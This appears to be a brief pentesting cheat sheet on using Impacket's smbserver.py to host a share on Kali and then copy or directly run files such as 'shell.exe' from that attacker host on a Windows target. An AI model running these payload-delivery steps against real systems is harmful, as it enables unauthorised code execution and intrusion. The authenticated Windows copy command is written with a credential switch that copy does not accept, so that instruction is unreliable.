SMB Server For Pentesting:
=========================
To create a share on kali:
	smbsever.py:
		launches a smb server
		sudo smbserver.py -username user -password pass abcd . -smb2support => authenciated
			abcd => sharename
		sudo smbserver.py abcd .
			abcd => sharename
To use that share on windows:(both Command Prompt and PowerShell)
	net view \\kali_ip => shows shares 
	copy \\kali_ip\abcd\file_name.exe => to copy some file
	\\kali_ip\abcd\file_name.exe => directly executing the file
To use that share on windows in aunthenicated way:(both Command Prompt and PowerShell)
	copy \\kali_ip\abcd\shell.exe /u:user pass
Note:
	mistake-1 => not using sharename
	mistake-2 => using '/'(wrong) instead of '\'(correct)
